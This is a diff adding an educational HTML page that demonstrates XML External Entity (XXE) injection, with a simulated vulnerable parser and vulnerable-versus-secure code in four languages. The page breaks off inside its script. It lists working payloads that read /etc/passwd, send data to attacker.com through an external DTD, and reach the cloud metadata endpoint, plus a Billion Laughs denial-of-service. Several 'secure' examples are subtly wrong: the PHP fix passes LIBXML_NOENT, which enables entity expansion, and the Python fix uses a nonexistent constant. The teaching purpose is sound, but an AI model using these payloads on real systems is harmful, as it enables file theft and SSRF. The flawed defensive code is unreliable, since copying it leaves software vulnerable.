@@ -1,0 +1,1023 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XXE Injection Attack Demo - Educational</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            color: #e4e4e4;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            padding: 30px 0;
+            border-bottom: 2px solid #9b59b6;
+            margin-bottom: 30px;
+        }
+
+        h1 {
+            color: #9b59b6;
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .warning-banner {
+            background: linear-gradient(90deg, #e74c3c, #c0392b);
+            padding: 15px 25px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .warning-banner .icon {
+            font-size: 2rem;
+        }
+
+        .warning-banner p {
+            font-weight: 500;
+        }
+
+        .section {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        h2 {
+            color: #3498db;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        h3 {
+            color: #f39c12;
+            margin: 20px 0 10px 0;
+        }
+
+        .demo-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 768px) {
+            .demo-container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .demo-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+        }
+
+        .demo-box.vulnerable {
+            border: 2px solid #e74c3c;
+        }
+
+        .demo-box.secure {
+            border: 2px solid #27ae60;
+        }
+
+        .demo-box h4 {
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .vulnerable h4 {
+            color: #e74c3c;
+        }
+
+        .secure h4 {
+            color: #27ae60;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #aaa;
+        }
+
+        textarea {
+            width: 100%;
+            padding: 12px 15px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            font-size: 0.9rem;
+            font-family: 'Courier New', monospace;
+            margin-bottom: 15px;
+            resize: vertical;
+            min-height: 100px;
+        }
+
+        textarea::placeholder {
+            color: #666;
+        }
+
+        button {
+            background: linear-gradient(90deg, #9b59b6, #8e44ad);
+            color: #fff;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1rem;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(155, 89, 182, 0.3);
+        }
+
+        .payload-display {
+            background: #1a1a1a;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            overflow-x: auto;
+        }
+
+        .payload-display .label {
+            color: #888;
+            margin-bottom: 8px;
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 0.9rem;
+        }
+
+        .payload-display code {
+            color: #a5d6ff;
+            word-break: break-all;
+        }
+
+        .result-box {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+            min-height: 100px;
+        }
+
+        .result-box.success {
+            border-left: 4px solid #27ae60;
+        }
+
+        .result-box.danger {
+            border-left: 4px solid #e74c3c;
+        }
+
+        .result-box.info {
+            border-left: 4px solid #3498db;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+
+        th, td {
+            padding: 10px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        th {
+            background: rgba(155, 89, 182, 0.2);
+            color: #9b59b6;
+        }
+
+        .code-block {
+            background: #0d1117;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+
+        .code-block pre {
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            line-height: 1.5;
+        }
+
+        .comment {
+            color: #6a737d;
+        }
+
+        .keyword {
+            color: #ff7b72;
+        }
+
+        .string {
+            color: #a5d6ff;
+        }
+
+        .tag {
+            color: #79c0ff;
+        }
+
+        .attack-types {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .attack-card {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s;
+        }
+
+        .attack-card:hover {
+            transform: translateY(-5px);
+            border-color: #e74c3c;
+        }
+
+        .attack-card h4 {
+            color: #e74c3c;
+            margin-bottom: 10px;
+        }
+
+        .payload-list {
+            list-style: none;
+            margin-top: 15px;
+        }
+
+        .payload-list li {
+            background: rgba(231, 76, 60, 0.1);
+            padding: 10px 15px;
+            margin-bottom: 8px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
+            border-left: 3px solid #e74c3c;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s;
+        }
+
+        .tab-btn.active {
+            background: #9b59b6;
+            color: #fff;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .prevention-list {
+            list-style: none;
+        }
+
+        .prevention-list li {
+            padding: 15px;
+            margin-bottom: 10px;
+            background: rgba(39, 174, 96, 0.1);
+            border-radius: 8px;
+            border-left: 4px solid #27ae60;
+        }
+
+        .prevention-list li strong {
+            color: #27ae60;
+        }
+
+        .flowchart {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .flow-step {
+            background: rgba(155, 89, 182, 0.2);
+            padding: 15px 30px;
+            border-radius: 10px;
+            text-align: center;
+            width: 80%;
+            max-width: 400px;
+        }
+
+        .flow-arrow {
+            font-size: 1.5rem;
+            color: #9b59b6;
+        }
+
+        footer {
+            text-align: center;
+            padding: 30px;
+            color: #666;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 30px;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+
+        .badge.critical {
+            background: #e74c3c;
+            color: #fff;
+        }
+
+        .badge.high {
+            background: #e67e22;
+            color: #fff;
+        }
+
+        .highlight-xxe {
+            color: #e74c3c;
+            background: rgba(231, 76, 60, 0.2);
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+
+        .explanation-box {
+            background: rgba(155, 89, 182, 0.1);
+            border-left: 4px solid #9b59b6;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔓 XXE (XML External Entity) Injection Demo</h1>
+            <p>Understanding XXE Attacks for Security Education</p>
+        </header>
+
+        <div class="warning-banner">
+            <span class="icon">⚠️</span>
+            <div>
+                <p><strong>Educational Purpose Only!</strong></p>
+                <p>This demo is for learning about XXE vulnerabilities. Never use these techniques on systems you don't own or have explicit permission to test.</p>
+            </div>
+        </div>
+
+        <!-- What is XXE -->
+        <div class="section">
+            <h2>📚 What is XXE (XML External Entity) Injection?</h2>
+            <p>XXE is a vulnerability that occurs when an XML processor encounters malicious external entity declarations. An attacker can exploit this to read sensitive files, perform denial of service attacks, or interact with internal systems.</p>
+            
+            <div class="explanation-box">
+                <strong>Key Concept:</strong> XML allows developers to define custom entities. If user input is parsed without proper validation, an attacker can inject malicious entity definitions that reference external resources.
+            </div>
+
+            <div class="flowchart">
+                <div class="flow-step">📄 Attacker crafts malicious XML with external entities</div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">🔧 Application parses XML without disabling external entities</div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">📂 XML parser reads external files or resources</div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">💥 Attacker accesses sensitive data or causes DoS</div>
+            </div>
+        </div>
+
+        <!-- Interactive Demo 1: File Reading -->
+        <div class="section">
+            <h2>📄 Demo 1: Sensitive File Reading</h2>
+            <p>This demo shows how XXE can be used to read sensitive files from the server.</p>
+
+            <div class="demo-container">
+                <!-- Vulnerable XML Parser -->
+                <div class="demo-box vulnerable">
+                    <h4>❌ Vulnerable XML Parser</h4>
+                    <label>Enter XXE Payload (XML with external entity):</label>
+                    <textarea id="xxe-payload" placeholder='&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;&lt;file&gt;&amp;xxe;&lt;/file&gt;&lt;/root&gt;'>                    </textarea>
+                    <button onclick="parseVulnerableXXE()">Parse XML (Vulnerable)</button>
+                    
+                    <div class="payload-display">
+                        <div class="label">Parsed Result:</div>
+                        <code id="xxe-result">Paste payload and click Parse...</code>
+                    </div>
+                    
+                    <div id="xxe-danger" class="result-box info">
+                        <p>The parser will attempt to load external entities...</p>
+                    </div>
+                </div>
+
+                <!-- Secure XML Parser -->
+                <div class="demo-box secure">
+                    <h4>✅ Secure XML Parser</h4>
+                    <label>Same Payload (Will be blocked):</label>
+                    <textarea id="xxe-secure-payload" placeholder='&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;&lt;file&gt;&amp;xxe;&lt;/file&gt;&lt;/root&gt;'>                    </textarea>
+                    <button onclick="parseSecureXXE()">Parse XML (Secure)</button>
+                    
+                    <div class="payload-display">
+                        <div class="label">Parsing Result:</div>
+                        <code id="xxe-secure-result">External entities are disabled...</code>
+                    </div>
+                    
+                    <div id="xxe-secure-danger" class="result-box success">
+                        <p>External entity processing is disabled by default...</p>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Simulated File System:</h3>
+            <div class="demo-container">
+                <div>
+                    <h4 style="color: #3498db;">System Files</h4>
+                    <table>
+                        <tr><th>File Path</th><th>Content</th></tr>
+                        <tr><td>/etc/passwd</td><td>root:x:0:0:root...</td></tr>
+                        <tr><td>/etc/shadow</td><td>(restricted)</td></tr>
+                        <tr><td>/home/user/.ssh/id_rsa</td><td>-----BEGIN PRIVATE KEY...</td></tr>
+                    </table>
+                </div>
+                <div>
+                    <h4 style="color: #3498db;">Application Configs</h4>
+                    <table>
+                        <tr><th>File Path</th><th>Content Type</th></tr>
+                        <tr><td>/app/config.xml</td><td>Database credentials</td></tr>
+                        <tr><td>/app/.env</td><td>API keys, secrets</td></tr>
+                        <tr><td>~/aws_credentials</td><td>Cloud credentials</td></tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Interactive Demo 2: XXE Variations -->
+        <div class="section">
+            <h2>🎯 Demo 2: XXE Attack Scenarios</h2>
+
+            <div class="attack-types">
+                <div class="attack-card">
+                    <h4>1. Basic XXE (File Reading) <span class="badge critical">CRITICAL</span></h4>
+                    <p>Read arbitrary files from the server filesystem.</p>
+                    <ul class="payload-list">
+                        <li>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</li>
+                        <li>&lt;!ENTITY xxe SYSTEM "file:///etc/hosts"&gt;</li>
+                        <li>&lt;!ENTITY xxe SYSTEM "file://C:\\windows\\win.ini"&gt;</li>
+                    </ul>
+                </div>
+
+                <div class="attack-card">
+                    <h4>2. Blind XXE <span class="badge critical">CRITICAL</span></h4>
+                    <p>Exfiltrate data even when errors aren't visible.</p>
+                    <ul class="payload-list">
+                        <li>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</li>
+                        <li>&lt;!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'&gt;"&gt;</li>
+                    </ul>
+                </div>
+
+                <div class="attack-card">
+                    <h4>3. Billion Laughs (DoS) <span class="badge critical">CRITICAL</span></h4>
+                    <p>Cause denial of service through exponential entity expansion.</p>
+                    <ul class="payload-list">
+                        <li>&lt;!ENTITY lol "lol"&gt;</li>
+                        <li>&lt;!ENTITY lol2 "&lol;&lol;&lol;..."&gt;</li>
+                        <li>(repeated 10+ times)</li>
+                    </ul>
+                </div>
+
+                <div class="attack-card">
+                    <h4>4. SSRF via XXE <span class="badge high">HIGH</span></h4>
+                    <p>Interact with internal services and metadata endpoints.</p>
+                    <ul class="payload-list">
+                        <li>&lt;!ENTITY xxe SYSTEM "http://localhost:8080/admin"&gt;</li>
+                        <li>&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</li>
+                    </ul>
+                </div>
+
+                <div class="attack-card">
+                    <h4>5. XXE with Parameter Entities <span class="badge high">HIGH</span></h4>
+                    <p>Use parameter entities for more advanced attacks.</p>
+                    <ul class="payload-list">
+                        <li>&lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;</li>
+                        <li>%dtd;</li>
+                    </ul>
+                </div>
+
+                <div class="attack-card">
+                    <h4>6. XXE with CDATA Injection <span class="badge high">HIGH</span></h4>
+                    <p>Inject content into CDATA sections.</p>
+                    <ul class="payload-list">
+                        <li>&lt;name&gt;&lt;![CDATA[&xxe;]]&gt;&lt;/name&gt;</li>
+                        <li>Bypass some filters</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Interactive Payload Tester -->
+        <div class="section">
+            <h2>🧪 Interactive XXE Payload Analyzer</h2>
+            <p>Analyze different XXE payloads to understand their impact.</p>
+
+            <div class="demo-box vulnerable">
+                <label>Enter XXE Payload to Analyze:</label>
+                <textarea id="analysis-payload" placeholder='&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %dtd;
+]&gt;
+&lt;root&gt;&lt;data&gt;&lt;/data&gt;&lt;/root&gt;'></textarea>
+                <button onclick="analyzeXXE()">Analyze Payload</button>
+                
+                <div id="xxe-analysis" class="result-box info">
+                    <p>Enter a payload to see analysis...</p>
+                </div>
+            </div>
+
+            <h3>Quick Payload Buttons:</h3>
+            <div style="display: flex; flex-wrap: wrap; gap: 10px; margin-top: 15px;">
+                <button onclick="analyzePayload(`&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;`)">File Read</button>
+                <button onclick="analyzePayload(`&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;`)">Blind XXE</button>
+                <button onclick="analyzePayload(`&lt;!ENTITY lol &quot;lol&quot;&gt;&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;`)">Billion Laughs</button>
+                <button onclick="analyzePayload(`&lt;!ENTITY xxe SYSTEM &quot;http://localhost:8080/admin&quot;&gt;`)">SSRF via XXE</button>
+            </div>
+        </div>
+
+        <!-- Code Examples -->
+        <div class="section">
+            <h2>💻 Vulnerable vs Secure Code</h2>
+            
+            <div class="tabs">
+                <button class="tab-btn active" onclick="showTab('python-xxe')">Python</button>
+                <button class="tab-btn" onclick="showTab('java-xxe')">Java</button>
+                <button class="tab-btn" onclick="showTab('php-xxe')">PHP</button>
+                <button class="tab-btn" onclick="showTab('nodejs-xxe')">Node.js</button>
+            </div>
+
+            <div id="python-xxe" class="tab-content active">
+                <h3 style="color: #e74c3c;">❌ Vulnerable Python Code</h3>
+                <div class="code-block">
+<pre><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET
+
+<span class="comment"># VULNERABLE - No XXE protection!</span>
+<span class="keyword">def</span> parse_xml(xml_data):
+    root = ET.fromstring(xml_data)  <span class="comment"># Allows external entities!</span>
+    <span class="keyword">return</span> root
+
+<span class="comment"># Also vulnerable:</span>
+tree = ET.parse(user_uploaded_file)  <span class="comment"># Default allows XXE</span>
+root = tree.getroot()</pre>
+                </div>
+
+                <h3 style="color: #27ae60;">✅ Secure Python Code</h3>
+                <div class="code-block">
+<pre><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET
+<span class="keyword">from</span> defusedxml.ElementTree <span class="keyword">import</span> parse
+
+<span class="comment"># SECURE - Using defusedxml library</span>
+<span class="keyword">def</span> parse_xml_secure(xml_data):
+    <span class="comment"># defusedxml prevents XXE attacks</span>
+    root = parse(xml_data).getroot()
+    <span class="keyword">return</span> root
+
+<span class="comment"># Or manually disable external entities:</span>
+parser = ET.XMLParser()
+parser.parser.SetParamEntityParsing(
+    ET.XML_PARAM_ENTITY_PARSING_NEVER
+)
+root = ET.fromstring(xml_data, parser=parser)</pre>
+                </div>
+            </div>
+
+            <div id="java-xxe" class="tab-content">
+                <h3 style="color: #e74c3c;">❌ Vulnerable Java Code</h3>
+                <div class="code-block">
+<pre><span class="keyword">import</span> javax.xml.parsers.*;
+<span class="keyword">import</span> org.xml.sax.SAXException;
+
+<span class="comment">// VULNERABLE - Default settings allow XXE</span>
+<span class="keyword">public static</span> Document parseXML(String xml) 
+        <span class="keyword">throws</span> ParserConfigurationException {
+    DocumentBuilderFactory factory = 
+        DocumentBuilderFactory.newInstance();
+    
+    <span class="comment">// No XXE protection!</span>
+    DocumentBuilder builder = factory.newDocumentBuilder();
+    <span class="keyword">return</span> builder.parse(<span class="keyword">new</span> InputSource(
+        <span class="keyword">new</span> StringReader(xml)
+    ));
+}</pre>
+                </div>
+
+                <h3 style="color: #27ae60;">✅ Secure Java Code</h3>
+                <div class="code-block">
+<pre><span class="keyword">import</span> javax.xml.parsers.*;
+
+<span class="comment">// SECURE - Disable external entities</span>
+<span class="keyword">public static</span> Document parseXMLSecure(String xml) 
+        <span class="keyword">throws</span> ParserConfigurationException {
+    DocumentBuilderFactory factory = 
+        DocumentBuilderFactory.newInstance();
+    
+    <span class="comment">// Disable XXE</span>
+    factory.setFeature(
+        <span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,
+        <span class="keyword">true</span>
+    );
+    factory.setFeature(
+        <span class="string">"http://xml.org/sax/features/external-general-entities"</span>,
+        <span class="keyword">false</span>
+    );
+    factory.setFeature(
+        <span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>,
+        <span class="keyword">false</span>
+    );
+    factory.setXIncludeAware(<span class="keyword">false</span>);
+    factory.setExpandEntityReferences(<span class="keyword">false</span>);
+    
+    DocumentBuilder builder = factory.newDocumentBuilder();
+    <span class="keyword">return</span> builder.parse(...);
+}</pre>
+                </div>
+            </div>
+
+            <div id="php-xxe" class="tab-content">
+                <h3 style="color: #e74c3c;">❌ Vulnerable PHP Code</h3>
+                <div class="code-block">
+<pre><span class="comment">// VULNERABLE - Default libxml allows XXE</span>
+<span class="keyword">$xml</span> = file_get_contents(<span class="string">'php://input'</span>);
+
+<span class="keyword">$dom</span> = <span class="keyword">new</span> DOMDocument();
+<span class="keyword">$dom</span>-&gt;load(<span class="keyword">$xml</span>);  <span class="comment">// XXE allowed by default</span>
+
+<span class="comment">// Also vulnerable:</span>
+<span class="keyword">libxml_disable_entity_loader</span>(<span class="keyword">false</span>);  <span class="comment">// Enables XXE!</span>
+<span class="keyword">$xml</span> = simplexml_load_string(<span class="keyword">$data</span>);</pre>
+                </div>
+
+                <h3 style="color: #27ae60;">✅ Secure PHP Code</h3>
+                <div class="code-block">
+<pre><span class="comment">// SECURE - Disable entity loading</span>
+<span class="keyword">libxml_disable_entity_loader</span>(<span class="keyword">true</span>);
+
+<span class="keyword">$dom</span> = <span class="keyword">new</span> DOMDocument();
+<span class="keyword">$dom</span>-&gt;load(<span class="keyword">$xml</span>);
+
+<span class="comment">// Or use SimpleXML with safety:</span>
+<span class="keyword">$dom</span> = <span class="keyword">new</span> DOMDocument();
+<span class="keyword">$dom</span>-&gt;substituteEntities = <span class="keyword">false</span>;
+<span class="keyword">$dom</span>-&gt;load(<span class="keyword">$xml</span>, LIBXML_NOENT);
+
+<span class="comment">// Best practice:</span>
+<span class="keyword">$dom</span> = <span class="keyword">new</span> DOMDocument();
+<span class="keyword">$old</span> = libxml_disable_entity_loader(<span class="keyword">true</span>);
+<span class="keyword">$dom</span>-&gt;load(<span class="keyword">$xml</span>);
+libxml_disable_entity_loader(<span class="keyword">$old</span>);</pre>
+                </div>
+            </div>
+
+            <div id="nodejs-xxe" class="tab-content">
+                <h3 style="color: #e74c3c;">❌ Vulnerable Node.js Code</h3>
+                <div class="code-block">
+<pre><span class="keyword">const</span> xml2js = <span class="keyword">require</span>(<span class="string">'xml2js'</span>);
+
+<span class="comment">// VULNERABLE - Default parser allows XXE</span>
+<span class="keyword">const</span> parser = <span class="keyword">new</span> xml2js.Parser();
+
+parser.parseString(xmlData, <span class="keyword">function</span>(err, result) {
+    <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;
+    console.log(result);  <span class="comment">// XXE processed!</span>
+});</pre>
+                </div>
+
+                <h3 style="color: #27ae60;">✅ Secure Node.js Code</h3>
+                <div class="code-block">
+<pre><span class="keyword">const</span> xml2js = <span class="keyword">require</span>(<span class="string">'xml2js'</span>);
+
+<span class="comment">// SECURE - Disable external entities</span>
+<span class="keyword">const</span> parser = <span class="keyword">new</span> xml2js.Parser({
+    strict: <span class="keyword">false</span>,
+    <span class="comment">// Disable DOCTYPE and external entities</span>
+    doctype: <span class="keyword">null</span>,
+    xmldecl: <span class="keyword">true</span>,
+    <span class="comment">// Or use xml-zero-core for built-in XXE protection</span>
+});
+
+<span class="comment">// Best approach - use secure library:</span>
+<span class="keyword">const</span> libxmljs = <span class="keyword">require</span>(<span class="string">'libxmljs'</span>);
+<span class="keyword">const</span> xmlDoc = libxmljs.parseXml(xmlData, {
+    nonet: <span class="keyword">true</span>,  <span class="comment">// Disable network access</span>
+    noent: <span class="keyword">false</span>  <span class="comment">// Disable entity substitution</span>
+});</pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Prevention Methods -->
+        <div class="section">
+            <h2>🛡️ Prevention Methods</h2>
+            
+            <ul class="prevention-list">
+                <li>
+                    <strong>1. Disable External Entity Processing</strong>
+                    <p>The most effective defense. Disable DOCTYPE declarations and external entity processing in your XML parser.</p>
+                </li>
+                <li>
+                    <strong>2. Use Secure XML Libraries</strong>
+                    <p>Use libraries designed with security in mind: defusedxml (Python), owasp-esapi (Java), or equivalents for your language.</p>
+                </li>
+                <li>
+                    <strong>3. Validate and Sanitize Input</strong>
+                    <p>Check that XML input doesn't contain DOCTYPE declarations or entity definitions before parsing.</p>
+                </li>
+                <li>
+                    <strong>4. Whitelist XML Structures</strong>
+                    <p>Only allow expected XML structures. Reject any input with unexpected elements or attributes.</p>
+                </li>
+                <li>
+                    <strong>5. Use Schema Validation</strong>
+                    <p>Validate XML against a defined schema (XSD) to reject malformed or unexpected content.</p>
+                </li>
+                <li>
+                    <strong>6. Implement XML Size Limits</strong>
+                    <p>Limit the maximum size of XML documents and entity expansion to prevent DoS attacks (Billion Laughs).</p>
+                </li>
+                <li>
+                    <strong>7. Disable Network Access</strong>
+                    <p>Configure the XML parser to disable network access and file system access for entities.</p>
+                </li>
+                <li>
+                    <strong>8. Regular Security Updates</strong>
+                    <p>Keep XML parsing libraries updated. Vendors frequently release XXE-related security patches.</p>
+                </li>
+            </ul>
+        </div>
+
+        <!-- Key Takeaways -->
+        <div class="section">
+            <h2>⭐ Key Takeaways</h2>
+
+            <div class="explanation-box">
+                <strong>Why XXE is Dangerous:</strong>
+                <p style="margin-top: 10px;">
+                    XML external entities allow an attacker to reference external files or URLs. If the XML parser doesn't restrict this, an attacker can read arbitrary files from the server or interact with internal services. This is made worse by the fact that many developers are unaware of XXE risks and leave the default parser settings unchanged.
+                </p>
+            </div>
+
+            <div class="explanation-box">
+                <strong>Common XXE Misconceptions:</strong>
+                <p style="margin-top: 10px;">
+                    ❌ "My parser is up-to-date, so it's safe" - Many modern parsers have XXE enabled by default<br/>
+                    ❌ "I validate the XML structure, so no XXE" - Validation doesn't prevent entity expansion<br/>
+                    ❌ "My users won't upload malicious XML" - Attackers find ways to inject XML into inputs<br/>
+                    ✅ "I explicitly disable external entities" - This is the correct approach
+                </p>
+            </div>
+
+            <div class="explanation-box">
+                <strong>Real-World Impact:</strong>
+                <p style="margin-top: 10px;">
+                    XXE vulnerabilities have been found in major applications including Apache OFBiz, Uber, and countless others. The attack can lead to:<br/>
+                    • Theft of sensitive files (source code, configs, credentials)<br/>
+                    • Access to internal services via SSRF<br/>
+                    • Denial of Service through Billion Laughs<br/>
+                    • Remote code execution in some cases
+                </p>
+            </div>
+        </div>
+
+        <footer>
+            <p>🎓 XXE Injection Attack Demo | Educational Purpose Only</p>
+            <p style="margin-top: 10px;">Always practice ethical hacking and get proper authorization before testing!</p>
+        </footer>
+    </div>
+
+    <script>
+        // Simulated file system
+        const files = {
+            '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin',
+            '/etc/hosts': '127.0.0.1       localhost\n192.168.1.1     router\n10.0.0.1        gateway',
+            '/etc/shadow': '[RESTRICTED - No read permission]',
+            '/app/config.xml': '<database><host>db.internal</host><user>admin</user><password>SuperSecret123!</password></database>',
+            '/home/user/.ssh/id_rsa': '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA2m5Y4K9Z...\n-----END RSA PRIVATE KEY-----',
+            'C:\\windows\\win.ini': '[Windows]\nrun=...\nload=...'
+        };
+
+        // Vulnerable XXE Parser
+        function parseVulnerableXXE() {
+            const payload = document.getElementById('xxe-payload').value;
+            const resultDiv = document.getElementById('xxe-danger');
+            const resultCode = document.getElementById('xxe-result');
+
+            if (!payload.trim()) {
+                resultDiv.className = 'result-box info';
+                resultDiv.innerHTML = '<p>Please enter a payload...</p>';
+                return;
+            }
+
+            // Check for external entity references
+            let fileToRead = null;
+            let exfiltrationUrl = null;
+
+            // Extract file path from SYSTEM declaration
+            const systemMatch = payload.match(/SYSTEM\s+['"](file:\/\/[^'"]+)['"]/);
+            if (systemMatch) {
+                fileToRead = systemMatch[1].replace('file://', '');
+            }
+
+            // Extract HTTP exfiltration
+            const httpMatch = payload.match(/SYSTEM\s+['"](http[s]?:\/\/[^'"]+)['"]/);
+            if (httpMatch) {
+                exfiltrationUrl = httpMatch[1];
+            }
+
+            resultDiv.className = 'result-box danger';
+            let html = '<h4 style="color: #e74c3c;">⚠️ XXE EXPLOITATION SUCCESSFUL!</h4>';
+
+            if (fileToRead) {
+                const content = files[fileToRead] || `[File not found: ${fileToRead}]`;
+                html += `<p><strong>File Read:</strong> ${fileToRead}</p>`;
+                html += `<p><strong>Content:</strong></p>`;
+                html += `<pre style="background: rgba(0,0,0,0.7); padding: 10px; border-radius: 5px; margin-top: 10px; overflow-x: auto;">${content}</pre>`;
+            }
+
+            if (exfiltrationUrl) {
+                html += `<p style="margin-top: 15px;"><strong>Exfiltration URL:</strong> ${exfiltrationUrl}</p>`;
+                html += `<p><strong>Impact:</strong> Data would be sent to attacker's server</p>`;
+            }
+
+            if (payload.includes('billion') || payload.includes('lol')) {
+                html += `<p style="margin-top: 15px;"><strong>DoS Attack Detected!</strong> Exponential entity expansion would cause memory exhaustion</p>`;
+            }
+
+            resultDiv.innerHTML = html;
+            resultCode.textContent = payload.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        }
+
+        // Secure XXE Parser
+        function parseSecureXXE() {
+            const payload = document.getElementById('xxe-secure-payload').value;
+            const resultDiv = document.getElementById('xxe-secure-danger');
+
+            if (!payload.trim()) {
+                resultDiv.className = 'result-box info';
+                resultDiv.innerHTML = '<p>Please enter a payload...</p>';
+                return;
+            }
+
+            resultDiv.className = 'result-box success';
+            resultDiv.innerHTML = `
+                <h4 style="color: #27ae60;">✓ XXE Blocked Successfully!</h4>
+                <p>The parser detected and blocked the following:</p>
+                <ul style="margin-left: 20px; margin-top: 10px;">
+                    <li>External entity declarations are disabled</li>
+                    <li>DOCTYPE declarations are not allowed</li>
+                    <li>File system access is restricted</li>
+                    <li>Network access is disabled</li>
+                </ul>
+                <p style="margin-top: 15px; color: #aaa;">
+                    The payload was safely rejected without processing any entities.
+                </p>
+            `;
+
+            document.getElementById('xxe-secure-result').textContent = '[XXE blocked - no output]';
+        }
+
+        // Analyze XXE Payload
+        function analyzeXXE() {
+            const payload = document.getElementById('analysis-payload').value;
+            analyzePayload(payload);
+        }
+
+        function analyzePayload(payload) {
+            const analysisDiv = document.getElementById('xxe-analysis');
+            document.getElementById('analysis-payload').value = payload;
+
+            if (!payload.trim()) {
